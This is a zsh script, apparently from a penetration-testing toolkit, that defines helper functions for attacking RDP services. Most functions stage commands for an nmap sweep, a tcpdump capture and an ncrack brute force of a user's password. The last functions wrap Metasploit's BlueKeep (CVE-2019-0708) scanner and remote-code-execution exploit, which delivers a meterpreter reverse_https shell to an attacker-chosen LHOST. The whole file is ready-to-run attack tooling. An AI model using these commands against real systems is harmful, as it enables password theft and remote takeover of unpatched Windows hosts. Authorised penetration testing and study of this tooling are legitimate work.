#!/usr/bin/env zsh

#############################################################
# qq-enum-rdp
#############################################################

qq-enum-rdp-help() {
    cat << "DOC"

qq-enum-rdp
------------
The qq-enum-rdp namespace contains commands for scanning
and enumerating RDP remote desktop services.

Commands
--------
qq-enum-rdp-install:                  installs dependencies
qq-enum-rdp-nmap-sweep:               scan a network for services
qq-enum-rdp-tcpdump:                  capture traffic to and from a host
qq-enum-rdp-ncrack:                   brute force passwords for a user account
qq-enum-rdp-bluekeep:                 bluekeep exploit reference
qq-enum-rdp-msf-bluekeep-scan:        bluekeep metasploit scanner
qq-enum-rdp-msf-bluekeep-exploit:     bluekeep metasploit exploit

DOC
}

qq-enum-rdp-install() {
    __info "Running $0..."
    __pkgs nmap tcpdump ncrack metasploit-framework
}

qq-enum-rdp-nmap-sweep() {
    __check-project
    qq-vars-set-network
    print -z "nmap -n -Pn -sS -p3389 ${__NETWORK} -oA $(__netpath)/rdp-sweep"
}

qq-enum-rdp-tcpdump() {
    __check-project
    qq-vars-set-iface
    qq-vars-set-rhost
    print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3389 -w $(__hostpath)/rdp.pcap"
}

qq-enum-rdp-ncrack() {
    __check-project
    qq-vars-set-rhost
    __check-user
    print -z "ncrack -vv --user ${__USER} -P ${__PASSLIST} rdp://${__RHOST} -oN $(__hostpath)/ncrack-rdp.txt "
}

qq-enum-rdp-bluekeep() {
    __info "https://sploitus.com/exploit?id=EDB-ID:47683"
    print -z "searchsploit bluekeep"
}

qq-enum-rdp-msf-bluekeep-scan() {
    __check-project
    qq-vars-set-rhost
    local cmd="use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS ${__RHOST}; run; exit"
    print -z "msfconsole -n -q -x \" ${cmd} \" | tee $(__hostpath/bluekeep-scan.txt)"
}

qq-enum-rdp-msf-bluekeep-exploit() {
    qq-vars-set-rhost
    qq-vars-set-lhost
    qq-vars-set-lport
    #__warn "Start a handler using on ${__LHOST}:${__LPORT} before proceeding"
    __msf << VAR
use windows/rdp/cve_2019_0708_bluekeep_rce;
set RHOSTS ${__RHOST};
set PAYLOAD windows/x64/meterpreter/reverse_https;
set stagerverifysslcert true;
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set LHOST ${__LHOST};
set LPORT ${__LPORT};
run;
exit
VAR

}
